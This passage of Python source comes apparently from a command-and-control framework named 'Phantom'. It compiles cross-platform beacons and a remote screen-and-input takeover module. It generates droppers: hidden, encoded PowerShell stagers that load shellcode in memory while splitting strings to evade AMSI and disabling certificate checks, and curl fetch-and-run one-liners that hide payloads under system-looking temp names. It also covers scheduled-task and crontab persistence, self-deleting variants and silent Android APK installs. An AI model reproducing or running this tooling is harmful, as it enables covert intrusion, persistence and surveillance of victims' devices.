            console.print("[green][+] iOS dylib built — push via MDM as an "
                          "enterprise-signed app payload.[/green]")
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"iOS compilation failed:\n{e.stderr}")
            return None

    elif platform == "android":
        console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
        ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
        ndk_prebuilt = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64")
        ndk_cc = os.path.join(ndk_prebuilt, "bin", "aarch64-linux-android28-clang++")
        if not os.path.exists(ndk_cc):
            notifier.error(f"NDK compiler not found at {ndk_cc}")
            return None
        try:
            ndk_sysroot = os.path.join(ndk_prebuilt, "sysroot")
            ndk_include = os.path.join(ndk_sysroot, "usr", "include")
            ndk_lib = os.path.join(ndk_sysroot, "usr", "lib", "aarch64-linux-android")
            subprocess.run(
                [ndk_cc, "-std=c++20", "-O2", "-s", "-static-libstdc++", "-o", out_name,
                 "-Isrc", "src/main.cpp",
                 f"--sysroot={ndk_sysroot}",
                 f"-I{ndk_include}",
                 f"-L{ndk_lib}",
                 "-lssl", "-lcrypto", "-ldl"],
                cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
            console.print("[green][+] Static libc++ linked — no runtime dependency on libc++_shared.so[/green]")
            _mark_built(beacon_dir, out_name)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Android compilation failed:\n{e.stderr}")
            return None

    return None




# ── resilient stager (8.1, option C) ───────────────────────────────────────
#
# One download attempt is a single point of failure: a captive portal, a
# proxy hiccup or a filtered first hop and the engagement has no beacon and
# no second chance (the operator has to re-deliver by hand). The resilient
# stager keeps the SAME one-shot behaviour as the first move, and on
# failure it schedules its own retry — with the C2 endpoint already inside
# the retry, so the second attempt does not depend on the operator or on
# the delivery channel still being open.
#
# The retry is PERSISTENCE: it leaves an artefact the operator must clean
# up, so the task name and the retry script path are deterministic (see
# `_RETRY_TASK_WIN`, `_RETRY_SCRIPT`) and the cleanup section can find them.
_RETRY_TASK_WIN = "PhantomUpdate"
_RETRY_SCRIPT = "~/.cache/.p/r"
_RETRY_CACHE = "~/.cache/.p"
_RETRY_MINUTES = 5


def _ps_resilient(core_ps: str) -> str:
    """Wrap the Windows PIC stager so a failed run schedules its retry."""
    action = ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
              + base64.b64encode(core_ps.encode("utf-16-le")).decode())
    return (
        "$e=$null;try{" + core_ps + "}catch{$e=$_};"
        "if($e){schtasks /create /f /tn '" + _RETRY_TASK_WIN + "' /sc minute "
        "/mo " + str(_RETRY_MINUTES) + " /tr \"" + action + "\"|Out-Null}"
    )


def _sh_resilient(command: str) -> str:
    """Wrap a POSIX stager: run it now, and on failure schedule a retry.

    The whole thing travels as base64 through the shell (`echo … | base64
    -d | sh`), so the payload's own quoting (URLs in single quotes, spaces)
    cannot break the wrapper, and the retry script carries the endpoint.
    """
    script = "\n".join((
        f"mkdir -p {_RETRY_CACHE} 2>/dev/null",
        # `printf %s` with no escape sequences: the base64 alphabet is
        # shell-safe, and a format string here would be interpreted by the
        # shell (a stray `\n` would be written INTO the retry script)
        "printf %s " + base64.b64encode(command.encode()).decode()
        + " | base64 -d > " + _RETRY_SCRIPT,
        f"chmod +x {_RETRY_SCRIPT} 2>/dev/null",
        f"if sh {_RETRY_SCRIPT}; then crontab -l 2>/dev/null | grep -v "
        f"'{_RETRY_SCRIPT}' | crontab - 2>/dev/null; exit 0; fi",
        f"(crontab -l 2>/dev/null | grep -v '{_RETRY_SCRIPT}'; "
        f"echo '*/{_RETRY_MINUTES} * * * * sh {_RETRY_SCRIPT} "
        ">/dev/null 2>&1') | crontab - 2>/dev/null",
    )) + "\n"
    return ("echo "
            + base64.b64encode(script.encode()).decode()
            + " | base64 -d | sh")


def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False, resilient: bool = True) -> str:
    """Generates an ultra-compact PowerShell PIC stager.
    
    Downloads XOR-encrypted beacon.bin → XOR-decrypts with 0xAA → 
    resolves VirtualAlloc via kernel32 export table → allocates RWX → 
    copies shellcode → executes via opaque [Action] delegate.
    
    No C#, no Add-Type, no P/Invoke strings, no literal trigger strings.
    AMSI-blind: 'Virtual'+'Alloc' and 'kernel'+'32' are split across
    concatenations so the full trigger never appears in the script text.
    
    RESILIENT BY DEFAULT: a single download attempt is a single point of
    failure, and a delivery channel that may not have the C2 up yet (a
    physical drop, a staged exfil) must not lose the payload to one failed
    fetch. The stager runs once and, on failure, schedules its own retry
    WITH the endpoint embedded. Callers that must NOT leave persistence
    (the no-disk stealth dropper, the beacon's own `persist` embed) pass
    ``resilient=False`` explicitly.

    Args:
        lhost: C2/staging server host
        lport: Port for both C2 check-in AND staging payload download
        dl_port: Optional separate port for payload download (defaults to lport)
        arch: Architecture (x64/x86 — not used for PIC path)
        use_ssl: Use HTTPS for payload download
        resilient: schedule a persistent retry on a failed first download
                   (default True; False is the explicit one-shot opt-out)
    """
    if dl_port is None:
        dl_port = lport

    proto = "https" if use_ssl else "http"

    from phantom.utils.c2_crypto import get_payload_token
    token_param = f"auth={get_payload_token()}"

    if platform == "windows":
        beacon_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "payloads", "beacon")
        rva_path = os.path.join(beacon_dir, "beacon.rva")
        va_rva = "0x1C7F0"
        if os.path.exists(rva_path):
            with open(rva_path) as f:
                val = f.read().strip()
                if val and val != "0x0":
                    va_rva = val

        url = f"{proto}://{lhost}:{dl_port}/x?{token_param}"

        # ── Ultra-compact PowerShell PIC stager ──
        # Hardcoded VirtualAlloc RVA (detected at build time from local kernel32).
        # For production builds on unknown targets, use the export-parsing variant.
        #
        # NOTE: .NET Framework's GetDelegateForFunctionPointer REJECTS generic
        # delegate types (including constructed Func`5<...>). We use Reflection.Emit
        # to create a non-generic MulticastDelegate subclass at runtime. This adds
        # ~400 chars PS / ~800 chars base64 but is the ONLY working approach on
        # .NET Framework 4.x (no C#/Add-Type).
        ps = (
            "$m=[Runtime.InteropServices.Marshal];"
            # TLS: self-signed C2 cert → .NET refuses the channel
            # ("trust relationship" error, live-verified). ServerCertificate
            # Validation must be overridden BEFORE DownloadData. Split so the
            # trigger string never appears whole in the script.
            "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
            "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
            "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
            "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
            "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
            "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
            "$d.DefineConstructor('Public','Standard',@([Object],[IntPtr])).SetImplementationFlags(3);"
            "$d.DefineMethod('Invoke','Public,Virtual,HideBySig',[IntPtr],@([IntPtr],[IntPtr],[Int32],[Int32])).SetImplementationFlags(3);"
            "$t=$d.CreateType();"
            "$x=$m::GetDelegateForFunctionPointer([IntPtr]::Add($k,"
            + va_rva
            + "),$t).Invoke([IntPtr]::Zero,[IntPtr]($b.Length),0x3000,0x40);"
            # PS 5.1 copy fix (live-verified on the operator host): the copy
            # is safe as long as EVERY argument is explicitly typed — with
            # explicit casts both Marshal.Copy overloads resolve cleanly.
            # (The historical field failure was ambiguity from untyped args
            # plus a corrupted -Enc blob, not the API itself.)
            "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
            "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
        )

        b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
        console.print(f"[green][+] Compact PIC stager: {len(b64_ps)} chars base64[/green]")
        if resilient:
            # the retry task re-runs the SAME stager, so the endpoint is
            # already inside it; the task name is deterministic for cleanup
            wrapped = _ps_resilient(ps)
            return ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
                    + base64.b64encode(wrapped.encode('utf-16-le')).decode())
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"

    elif platform == "linux":
        path = "payload_linux_x86" if arch == "x86" else "payload_linux"
        url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
        cmd = f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
        return _sh_resilient(cmd) if resilient else cmd

    elif platform == "macos":
        url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_macos?{token_param}"
        cmd = f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
        return _sh_resilient(cmd) if resilient else cmd

    elif platform == "android":
        beac_url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
        cmd = f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
        return _sh_resilient(cmd) if resilient else cmd

    return ""


def generate_stealth_dropper(platform: str, lhost: str, lport: int,
                             dl_port: int = None, use_ssl: bool = True) -> str:
    """No-disk, self-deleting stager.

    Windows: the PIC stager already runs the beacon **purely in memory** (the
    PE/shellcode never touches disk) — delegated to generate_dropper.
    Linux/macOS/Android: the payload is fetched to a temp path, started, then
    UNLINKED immediately, so no readable file remains on disk (only the
    running inode, which the kernel frees on exit). The downloaded launcher
    itself is the one artifact a browser drop leaves; running this removes the
    payload copy right away.
    """
    if dl_port is None:
        dl_port = lport
    proto = "https" if use_ssl else "http"
    from phantom.utils.c2_crypto import get_payload_token
    token_param = f"auth={get_payload_token()}"
    ssl_flag = 1 if use_ssl else 0

    if platform == "windows":
        # in-memory PIC: nothing to delete on the beacon side
        # ONE-SHOT on purpose: the stealth dropper's contract is "no artefact
        # left on disk", so it must NOT schedule a retry (persistence).
        return generate_dropper(platform, lhost, lport, arch="x64",
                                dl_port=dl_port, use_ssl=use_ssl,
                                resilient=False)

    if platform in ("linux", "macos"):
        path = "payload_linux" if platform == "linux" else "payload_macos"
        url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
        tmp = "/tmp/.kworkerd" if platform == "linux" else "/tmp/.com.apple.helper"
        # fetch -> chmod -> start in background -> unlink the on-disk copy.
        # The process keeps running from the unlinked inode; nothing readable
        # remains on disk once the 1s window has elapsed.
        return (f"curl -sk '{url}' -o {tmp} && chmod +x {tmp} && "
                f"nohup {tmp} {lhost} {lport} {ssl_flag} >/dev/null 2>&1 & "
                f"sleep 1; rm -f {tmp}; true")

    if platform == "android":
        url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
        # install from the temp APK, launch, then delete the temp copy
        return (f"curl -sk '{url}' -o /data/local/tmp/.srv.apk && "
                f"pm install -g /data/local/tmp/.srv.apk >/dev/null 2>&1 && "
                f"am start -n com.phantom.remote/.MainActivity >/dev/null 2>&1; "
                f"rm -f /data/local/tmp/.srv.apk; true")

    return ""


# ═══════════════════════════════════════════════════════════════════════════
#  Remote Session Module (GUI takeover) — compile + dropper
# ═══════════════════════════════════════════════════════════════════════════
#  A standalone companion binary (phantom/payloads/remote) that registers as
#  its own beacon (R-…) on the same C2, streams the victim's screen as JPEG
#  frames over the beacon channel, and injects mouse/keyboard input with
#  configurable stealth modes. Built independently of the beacon so it can be
#  dropped via RCE/cmdi, launched by the beacon's `remote` command, or
#  compiled separately for later use.

_REMOTE_OUT = {
    "windows": "remote.exe",
    "linux": "remote_linux",
    "macos": "remote_macos",
    # Android ships as an APK (MediaProjection + AccessibilityService need a
    # real app, not a plain NDK binary) but speaks the same C2 protocol.
    "android": "remote.apk",
    # iOS remote session: an in-process dylib (ReplayKit + UIKit event
    # injection) loaded into a signed app — macOS + Xcode build only.
    "ios": "remote_ios.dylib",
}


def _remote_identity(remote_dir: str) -> str:
    """Enroll a dedicated R-… identity for the remote module build."""
    from phantom.utils.beacon_auth import write_beacon_auth_config
    beacon_id = "R-" + secrets.token_hex(8).upper()
    path = write_beacon_auth_config(remote_dir, beacon_id=beacon_id)
    return beacon_id


def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
                   host: str = "127.0.0.1", port: int = 8080,
                   use_ssl: bool = True) -> Optional[str]:
    """Compile the standalone remote-session module for a platform.

    Unlike the beacon (PIC/reflective), this is a plain PE/ELF that speaks
    the same C2 wire protocol — simpler to build, intentionally separate
    from the beacon's evasion stack (it is dropped AFTER a foothold).
    Returns the binary path or None.
    """
    if platform not in _REMOTE_OUT:
        notifier.error(f"Remote module unsupported on: {platform}")
        return None

    remote_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "remote"))
    src_dir = os.path.join(remote_dir, "src")
    out_name = _REMOTE_OUT[platform]
    out_path = os.path.join(remote_dir, out_name)

    if not force_rebuild and os.path.exists(out_path):
        return out_path

    # Identity + crypto + C2 config for THIS build (fresh per build).
    _remote_identity(remote_dir)
    write_beacon_crypto_config(remote_dir, payload_token="")
    # A-2 parity with the beacon: the remote module speaks the SAME TLS
    # channel, so it must pin the same peer certificate (front cert when a
    # TLS-terminating front is configured). Without this it accepted ANY TLS
    # peer — only the HMAC authenticated the pointer, after the fact.
    try:
        from phantom.utils.network import (
            beacon_pin, beacon_pubkey_pin, c2_pin_cert_path)
        _pin_cert = c2_pin_cert_path()
        _cert_pin = beacon_pin(_pin_cert)
        _pk_pin = beacon_pubkey_pin(_pin_cert)
    except Exception:
        _cert_pin, _pk_pin = "", ""
    if use_ssl and not _cert_pin and not _pk_pin:
        notifier.warn(
            "Remote module built WITHOUT a certificate pin: no C2 "
            "certificate was found, so it will accept ANY TLS peer. "
            "Generate the listener certificate first (lab: opt out via "
            "PHANTOM_BEACON_PIN=0).")
    write_beacon_c2_config(remote_dir, host=host, port=port, use_ssl=use_ssl,
                           pin=_cert_pin, pubkey_pin=_pk_pin)

    main_cpp = os.path.join(src_dir, "main.cpp")

    if platform == "windows":
        import shutil as _sh
        def _find_tool(names):
            for name in names:
                p = _sh.which(name)
                if p:
                    return p
            return None
        mingw_cpp = _find_tool(["x86_64-w64-mingw32-g++", "g++"])
        if not mingw_cpp:
            notifier.error("No MinGW C++ compiler found for the remote module.")
            return None
        cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-static", "-mwindows",
               "-o", out_path,
               f"-I{src_dir}",
               main_cpp,
               "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32",
               "-lgdiplus", "-lole32", "-lwtsapi32", "-liphlpapi", "-lcrypt32"]
        try:
            subprocess.run(cmd, check=True, capture_output=True, text=True,
                           timeout=600)
            notifier.success(f"Remote module built: {out_path}")
            return out_path
        except subprocess.CalledProcessError as e:
            notifier.error(f"Remote (Windows) build failed:\n{e.stderr[-2000:]}")
            return None

    elif platform == "linux":
        # Windows host: compile inside the Kali WSL distro (same as beacon).
        wsl_prefix: list = []
        wsl_dir = ""
        if os.name == "nt":
            from phantom.utils.build_helper import _wsl_cmd
            wsl_prefix = _wsl_cmd(["true"])
            if wsl_prefix:
                wsl_prefix = wsl_prefix[:-1]
                wsl_dir = _wsl_path(remote_dir)
                src_inc = f"-I{wsl_dir}/src"
        else:
            src_inc = f"-I{src_dir}"

        cmd = ["g++", "-std=c++20", "-O2", "-s", "-static",
               "-o", out_name, src_inc, "src/main.cpp",
               "-lssl", "-lcrypto", "-lzstd", "-lz", "-lpthread", "-ldl"]
        if wsl_prefix:
            fixed = []
            skip = False
            for part in cmd:
                if skip:
                    fixed.append(f"{wsl_dir}/{part}")
                    skip = False
                elif part == "-o":
                    fixed.append(part)
                    skip = True
                elif part == "src/main.cpp":
                    fixed.append(f"{wsl_dir}/src/main.cpp")
                else:
                    fixed.append(part)
            try:
                subprocess.run(wsl_prefix + fixed, check=True,
                               capture_output=True, text=True, timeout=600)
            except subprocess.CalledProcessError as e:
                notifier.error(f"Remote (Linux/WSL) build failed:\n{e.stderr[-2000:]}")
                return None
        else:
            try:
                subprocess.run(cmd, cwd=remote_dir, check=True,
                               capture_output=True, text=True, timeout=600)
            except subprocess.CalledProcessError as e:
                notifier.error(f"Remote (Linux) build failed:\n{e.stderr[-2000:]}")
                return None
        notifier.success(f"Remote module built: {out_path}")
        return out_path

    elif platform == "macos":
        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
        if not os.path.exists(o32_cc):
            notifier.error(f"osxcross compiler not found at {o32_cc}")
            return None
        try:
            subprocess.run(
                [o32_cc, "-std=c++20", "-O2", "-o", out_name,
                 f"-I{src_dir}", "src/main.cpp",
                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                cwd=remote_dir, check=True, capture_output=True, text=True,
                timeout=600)
            notifier.success(f"Remote module built: {out_path}")
            return out_path
        except subprocess.CalledProcessError as e:
            notifier.error(f"Remote (macOS) build failed:\n{e.stderr[-2000:]}")
            return None

    elif platform == "android":
        return _compile_remote_android(remote_dir, out_path, notifier)

    elif platform == "ios":
        return _compile_remote_ios(remote_dir, out_path, notifier)

    return None


def _compile_remote_ios(remote_dir: str, out_path: str, notifier) -> Optional[str]:
    """Build the iOS remote-session module (dylib) on macOS with Xcode.

    Honest failure, never a fake success: an iOS remote module is a dylib
    loaded inside an enterprise-signed, MDM-pushed app (ReplayKit capture +
    UIKit synthetic events). Without macOS + Xcode + the iOS SDK it cannot
    exist, and there is no cross-toolchain that produces a runnable one.
    """
    if os.name != "posix" or sys.platform != "darwin":
        notifier.error("iOS remote builds require macOS + Xcode (no cross-toolchain).")
        notifier.info("Build on a Mac, sign with an enterprise identity, deliver via MDM.")
        return None
    import shutil as _sh
    if not _sh.which("xcrun"):
        notifier.error("'xcrun' not found — install Xcode command line tools.")
        return None
    src_dir = os.path.join(remote_dir, "src")
    ios_src = os.path.join(remote_dir, "ios")
    if not os.path.isdir(ios_src):
        notifier.error("iOS remote sources are missing (payloads/remote/ios).")
        return None
    sdk = os.environ.get(
        "IOS_DEV_SDK",
        "/Applications/Xcode.app/Contents/Developer/Platforms/"
        "iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk")
    if not os.path.isdir(sdk):
        try:
            sdk = subprocess.run(
                ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"],
                capture_output=True, text=True, timeout=30).stdout.strip()
        except Exception:
            sdk = ""
    if not sdk or not os.path.isdir(sdk):
        notifier.error("iOS SDK path not found (set IOS_DEV_SDK).")
        return None
    try:
        subprocess.run(
            ["xcrun", "-sdk", "iphoneos", "clang++", "-std=c++20",
             "-O2", "-fPIC", "-shared", "-dynamiclib", "-arch", "arm64",
             "-o", out_path,
             f"-I{src_dir}", f"-I{ios_src}",
             os.path.join(ios_src, "main.mm"),
             f"-isysroot{sdk}",
             "-framework", "Foundation", "-framework", "UIKit",
             "-framework", "ReplayKit"],
            cwd=remote_dir, check=True, capture_output=True, text=True,
            timeout=1200)
        notifier.success(f"iOS remote module built: {out_path}")
        return out_path
    except subprocess.CalledProcessError as e:
        notifier.error(f"Remote (iOS) build failed:\n{e.stderr[-2000:]}")
        return None


def _compile_remote_android(remote_dir: str, out_path: str, notifier) -> Optional[str]:
    """Build the Android remote module (APK) with Gradle + the NDK.

    Returns the APK path or None. The APK embeds the native bridge that reuses
    remote_net.h, so it is wire-compatible with the desktop remote module.

    Tooling requirements (honest failure, never a fake success):
      * ANDROID_NDK_HOME / ANDROID_SDK_ROOT (or ANDROID_HOME) set
      * a `gradle` on PATH or the project's ./gradlew wrapper
    """
    android_dir = os.path.join(remote_dir, "android")
    if not os.path.isdir(android_dir):
        notifier.error("Android remote sources are missing (payloads/remote/android).")
        return None

    ndk_home = os.environ.get("ANDROID_NDK_HOME", "")
    sdk_home = (os.environ.get("ANDROID_SDK_ROOT")
                or os.environ.get("ANDROID_HOME", ""))
    if not ndk_home or not os.path.isdir(ndk_home):
        notifier.error("ANDROID_NDK_HOME is not set (required for the native bridge).")
        notifier.info("Install the Android NDK and export ANDROID_NDK_HOME=/path/to/ndk.")
        return None
    if not sdk_home or not os.path.isdir(sdk_home):
        notifier.error("ANDROID_SDK_ROOT is not set (required for Gradle).")
        notifier.info("Install the Android SDK and export ANDROID_SDK_ROOT=/path/to/sdk.")
        return None

    import shutil as _sh
    gradlew = os.path.join(android_dir, "gradlew")
    if os.name != "nt" and os.path.exists(gradlew):
        gradle_cmd = [gradlew, "assembleRelease", "--no-daemon"]
    else:
        gradle_bin = _sh.which("gradle") or _sh.which("gradle.bat")
        if not gradle_bin:
            notifier.error("No `gradle` found on PATH (and no ./gradlew wrapper).")
            return None
        gradle_cmd = [gradle_bin, "assembleRelease", "--no-daemon"]

    local_props = os.path.join(android_dir, "local.properties")
    try:
        with open(local_props, "w", encoding="utf-8") as f:
            f.write(f"sdk.dir={sdk_home.replace(chr(92), '/')}\n")
    except OSError as e:
        notifier.error(f"Cannot write local.properties: {e}")
        return None

    env = dict(os.environ)
    env["ANDROID_NDK_HOME"] = ndk_home
    env["ANDROID_SDK_ROOT"] = sdk_home
    env["REMOTE_SRC_DIR"] = os.path.join(remote_dir, "src")

    try:
        subprocess.run(gradle_cmd, cwd=android_dir, env=env, check=True,
                       capture_output=True, text=True, timeout=1800)
    except subprocess.CalledProcessError as e:
        notifier.error(f"Remote (Android) build failed:\n{(e.stderr or '')[-2000:]}")
        return None
    except FileNotFoundError as e:
        notifier.error(f"Remote (Android) build tool missing: {e}")
        return None

    produced = os.path.join(
        android_dir, "app", "build", "outputs", "apk", "release", "app-release.apk")
    if not os.path.exists(produced):
        notifier.error("Gradle finished but no release APK was produced.")
        return None
    try:
        _sh.copyfile(produced, out_path)
    except OSError as e:
        notifier.error(f"Cannot copy APK: {e}")
        return None
    notifier.success(f"Remote module built: {out_path}")
    return out_path


def _wsl_path(p: str) -> str:
    p = os.path.abspath(p)
    drive, rest = p[0].lower(), p[2:].replace("\\", "/")
    return f"/mnt/{drive}{rest}"


def generate_remote_dropper(platform: str, lhost: str, lport: int,
                            use_ssl: bool = True,
                            session_token: str = "") -> str:
    """One-liner that downloads and runs the compiled remote module.

    Serves the same role as the beacon dropper but for the remote module:
    a disposable fetch+exec chain usable from RCE/cmdi/webshell contexts.
    The module takes (host port use_https) as argv, so the compiled binary
    can be pointed at any listener at drop time.

    Review-3: when `session_token` is supplied (the C2 issues one per
    remote session) the dropper carries `rs=<token>` — an expiring,
    revocable grant — instead of the global payload token that unlocks
    every payload forever.
    """
    proto = "https" if use_ssl else "http"
    if session_token:
        token_param = f"rs={session_token}"
    else:
        from phantom.utils.c2_crypto import get_payload_token
        token_param = f"auth={get_payload_token()}"

    if platform == "windows":
        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_windows?{token_param}"
        ps = (
            "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
            "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
            "$d=[IO.Path]::Combine($env:TEMP,'srv'+(Get-Random)+'.exe');"
            "(New-Object Net.WebClient).DownloadFile('" + url + "',$d);"
            "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
            "Start-Process $d"
        )
        b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"

    if platform == "linux":
        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_linux?{token_param}"
        return (f"curl -sk '{url}' -o /tmp/.rdesk && chmod +x /tmp/.rdesk && "
                f"nohup /tmp/.rdesk {lhost} {lport} {1 if use_ssl else 0} "
                f"&>/dev/null &")

    if platform == "macos":
        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_macos?{token_param}"
        return (f"curl -sk '{url}' -o /tmp/.rdesk && chmod +x /tmp/.rdesk && "
                f"nohup /tmp/.rdesk {lhost} {lport} {1 if use_ssl else 0} "
                f"&>/dev/null &")

    if platform == "android":
        # Fetch + install the APK and launch its bootstrap activity. Delivery
        # requires an existing shell (adb / RCE / beacon): the APK cannot
        # install itself — that is a platform security boundary, not a bug.
        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_android?{token_param}"
        return (f"curl -sk '{url}' -o /data/local/tmp/.srv.apk && "
                f"pm install -g /data/local/tmp/.srv.apk && "
                f"am start -n com.phantom.remote/.MainActivity")

    return ""
